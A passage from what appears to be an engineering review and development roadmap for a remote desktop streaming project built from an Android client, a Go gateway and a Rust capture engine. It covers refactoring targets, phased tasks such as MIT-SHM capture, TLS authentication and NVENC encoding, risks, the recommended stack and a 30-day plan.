- **Integer RGB→YUV conversion** — SIMD-friendly, no FPU overhead.
- **Environment recovery system** — comprehensive and works across DEs.
- **cyberpunk theme engine** — differentiator for the product.
- **Macro import/export system** with JSON/TOML/YAML support.

### Refactor (improve structure, keep logic)
- **Decompose AgentViewModel** (1630 lines) → split into `ConnectionViewModel`, `StreamViewModel`, `MacroViewModel`, `FileTransferViewModel`, `ThemeViewModel`.
- **Decompose StreamScreen** (1577 lines) → `VideoCanvas`, `ControlDeck`, `KeyboardInput`, `ClipboardDialog`, `ZoomControls`.
- **Decompose SettingsScreen** (1900+ lines) → theme, macros, network, streaming preference screens.
- **Split Go main.go** (1792 lines) → separate files for handlers, UDS, WebRTC, files, macros.
- **Make `width()`/`height()` dynamic** in `capture/mod.rs` instead of hardcoded 1920×1080.

### Rewrite (must rebuild)
- **X11 capture** (`x11.rs`). Must implement actual MIT-SHM capture. This is the #1 blocker.
- **NVENC encoder** — config struct exists but code path doesn't. Need FFmpeg subprocess integration or nvcodec bindings.

### Remove (dead/unused code)
- **MJPEG codec path** in Go if not actively used (dual-path complexity not warranted).
- **WebRTC manager** in Android if `useWebRtc` will stay false (or enable it).
- **NVENC config struct** if not planning to implement (document or implement).

---

## 16. Development Roadmap

### Phase 1: Foundation Fixes (2-3 weeks)

**Goals**: Make X11 capture work. Ship a functional streaming product.

| Task | Dependencies | Risk |
|---|---|---|
| Implement X11 MIT-SHM capture (replace stub) | None | Low — XCB bindings already in Cargo.toml |
| Make `width()`/`height()` dynamic from actual capture | X11 capture | Low |
| Add graceful shutdown signal handler | None | Low |
| Fix Go MJPEG/H.264 routing edge cases | None | Low |
| Add basic unit tests for Rust capture + IPC | None | Low |
| Verify end-to-end X11 streaming on actual hardware | X11 capture | Low |

### Phase 2: Security & Reliability (3-4 weeks)

**Goals**: Secure the protocol. Make connections survive network blips.

| Task | Dependencies | Risk |
|---|---|---|
| Add TLS to HTTP/WebSocket endpoints | None | Medium — cert management |
| Add authentication token (pre-shared key) | TLS | Medium |
| Add TURN server config for WebRTC NAT traversal | WebRTC enablement | Medium |
| Add mDNS/Zeroconf discovery (Avahi) | None | Low |
| Add Rust-side frame pacing without Go connected | None | Low |
| Add log rotation | None | Low |
| Add server→client clipboard sync | None | Medium |
| Replace i3-msg with EWMH generic workspace control | None | Medium |

### Phase 3: Performance & Features (4-6 weeks)

**Goals**: Hardware encoding, audio, multi-monitor, full test coverage.

| Task | Dependencies | Risk |
|---|---|---|
| Implement NVENC via FFmpeg subprocess | Phase 1 | Medium |
| Add audio capture + Opus encoding + streaming | Phase 2 | High — sync challenges |
| Implement multi-monitor support (monitor selection) | Phase 1 | Medium |
| Make WebRTC toggleable and working (wasm/gRPC signaling) | Phase 2 TURN | Low |
| Add integration tests (Xvfb + Android emulator) | Phase 1 | Medium |
| CI/CD pipeline (GitHub Actions) | All tests | Low |
| Add window manager agnosticism (EWMH compliance) | Phase 2 | Medium |

### Phase 4: AI & Advanced Features (8-12 weeks)

**Goals**: AI desktop agent, voice control, multi-device management.

| Task | Dependencies | Risk |
|---|---|---|
| Build AI command execution layer | Phase 1, 2 | High |
| Integrate local LLM (Ollama) | AI layer | Medium |
| Build desktop understanding (vision) | Streaming pipeline | High |
| Voice assistant (Android ASR + TTS) | AI layer | Medium |
| Multi-device management dashboard | Phase 2 | Medium |
| Terminal view integration | Phase 1 | Low |
| Developer workflow automation (git, build, deploy macros) | Macro system | Medium |

---

## 17. Final CTO Summary

### 1. Current Completion Percentage
**~40%**. The streaming pipeline is architecturally complete but the critical X11 capture path is not implemented. The Android app is feature-rich. The Go gateway is comprehensive. The Rust engine has good structure but hollow capture.

### 2. Biggest Technical Risks
| Risk | Severity | Mitigation |
|---|---|---|
| X11 capturer is stub (project cannot function on X11) | **Critical** | Implement MIT-SHM — 1 day with XCB bindings |
| Zero security (no auth, no TLS) | **High** | Add pre-shared key + TLS (Phase 2) |
| Wayland requires user portal approval every session | **High** | Implement persistent portal session or fallback to Xwayland |
| No tests anywhere | **High** | Start with Rust capture/IPC tests (Phase 1) |
| Single ViewModel/God composables | **Medium** | Refactor incrementally |

### 3. Fastest Path to MVP
1. **Implement X11 MIT-SHM capture** (1 day) — the XCB crate is already a dependency, just need to call `xcb::shm::*` APIs
2. **Ship** — that's literally it for a functional MVP. Everything else is already wired up.
3. **Total: ~1 week** with the above + basic testing on real hardware.

### 4. Fastest Path to Production
1. Fix X11 capture (1 day)
2. Add TLS + pre-shared key authentication (1 week)
3. Add mDNS discovery (3 days) — no need for manual IP entry
4. Add TURN for NAT traversal (1 week) — enables internet use
5. Production hardening — log rotation, timeouts, rate limiting (3 days)
6. CI/CD + test suite (1 week)
**Total: ~4-5 weeks** with a focused team of 2.

### 5. Components That Should Never Be Rewritten
- **UDS protocol** — frame header + command packet format is well-designed
- **MediaCodec H.264 surface decoding** — hardware-accelerated, zero-copy, industry standard
- **Multi-process architecture** — privilege separation is correct
- **Integer RGB→YUV conversion** — SIMD-friendly, already optimized
- **Environment recovery** — comprehensive and battle-tested for Linux DE variety

### 6. Components That Must Be Rewritten
- **X11 capturer** (`x11.rs`) — entire file is a stub
- **NVENC integration** — config exists, no implementation
- **Go monolithic file** — should be split into packages (medium priority)

### 7. Recommended Final Stack
```
Android: Kotlin + Jetpack Compose + MediaCodec + OkHttp (keep)
Transport: WebSocket (default) + WebRTC (fallback for NAT) (keep)
Go Gateway: gorilla/websocket + pion/webrtc + REST (keep, modularize)
Rust Engine: xcb (X11) + gstreamer (Wayland) + openh264 (SW) + FFmpeg (NVENC HW) (keep, fix X11, add NVENC)
VPN: Tailscale (keep CGNAT detection)
Audio: Opus via GStreamer (add)
Security: TLS + pre-shared key (add)
Discovery: mDNS/Avahi + Tailscale MagicDNS + ADB (add mDNS)
```

### 8. Recommended Next 30 Days
| Week | Focus | Deliverables |
|---|---|---|
| **Week 1** | Fix X11 capture | Working MIT-SHM capturer; end-to-end streaming verified; unit tests for capture + IPC |
| **Week 2** | Security + reliability | TLS + auth; graceful shutdown; log rotation; clipboard server→client |
| **Week 3** | Decompose + test | Refactor Go into packages; decompose Android ViewModel; integration tests |
| **Week 4** | Performance + polish | mDNS discovery; NVENC implementation; Wayland portal persistence fix |

---

## Prioritized Action Plan

### Immediate (this week)
- [ ] **CRITICAL**: Implement X11 MIT-SHM capture in `server/rust/src/capture/x11.rs` — replace the empty stub with real XCB MIT-SHM calls
- [ ] Add `width()`/`height()` caching from actual capture dimensions (not hardcoded 1920×1080)
- [ ] Add graceful shutdown handler (SIGTERM/SIGINT) for Rust daemon
- [ ] Remove or fix the dead WebRTC code path (hardcoded `useWebRtc = false`)

### Short Term (next 2 weeks)
- [ ] Add TLS + pre-shared key authentication to Go gateway
- [ ] Add unit tests for Rust capture module and IPC protocol
- [ ] Replace i3-msg with EWMH/NetWM generic workspace control
- [ ] Add server→client clipboard sync
- [ ] Add log rotation

### Medium Term (next 1-2 months)
- [ ] Decompose AgentViewModel → focused ViewModels
- [ ] Decompose StreamScreen/SettingsScreen → components
- [ ] Split Go main.go into packages
- [ ] Implement NVENC hardware encoding
- [ ] Add audio streaming (Opus)
- [ ] Add mDNS/Zeroconf discovery
- [ ] Enable and test WebRTC + TURN for NAT traversal
- [ ] Add integration test suite
- [ ] CI/CD pipeline

### Long Term (2-4 months)
- [ ] Multi-monitor support
- [ ] AI desktop agent layer
- [ ] Voice assistant
- [ ] Multi-device management
- [ ] Developer workflow automation
- [ ] Terminal integration
